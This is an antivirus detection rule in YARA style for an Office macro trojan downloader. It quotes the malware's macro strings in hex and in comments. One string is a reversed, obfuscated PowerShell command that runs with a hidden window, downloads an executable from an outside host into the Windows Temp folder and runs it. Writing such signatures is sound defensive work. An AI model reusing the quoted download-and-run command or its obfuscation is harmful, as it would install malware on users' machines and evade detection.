
rule TrojanDownloader_O97M_Powdow_PKPW_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PKPW!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 45 78 65 63 75 74 65 28 31 2c 20 53 74 72 52 65 76 65 72 73 65 28 22 6e 65 70 4f 22 29 2c 20 53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e 6c 6c 65 68 73 72 65 77 6f 70 22 29 } //1 ShellExecute(1, StrReverse("nepO"), StrReverse("exe.llehsrewop")
		$a_01_1 = {53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e 51 6d 52 66 4e 5c 70 6d 65 54 5c 73 77 6f 64 6e 69 57 5c 3a 43 20 65 78 65 2e 72 65 72 6f 6c 70 78 65 3b 65 78 65 2e 51 6d 52 66 4e 5c 70 6d 65 54 5c 73 77 6f 64 6e 69 57 5c 3a 43 20 6f 2d 20 65 78 65 2e 41 44 57 57 71 2f 78 78 78 67 77 61 64 2f 6d 6f 63 2e 6e 72 75 74 71 65 74 2f 2f 3a 73 70 74 74 68 20 74 65 67 77 20 6e 65 64 64 69 48 20 65 6c 79 74 53 77 6f 64 6e 69 57 2d 20 } //1 StrReverse("exe.QmRfN\pmeT\swodniW\:C exe.rerolpxe;exe.QmRfN\pmeT\swodniW\:C o- exe.ADWWq/xxxgwad/moc.nrutqet//:sptth tegw neddiH elytSwodniW- 
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}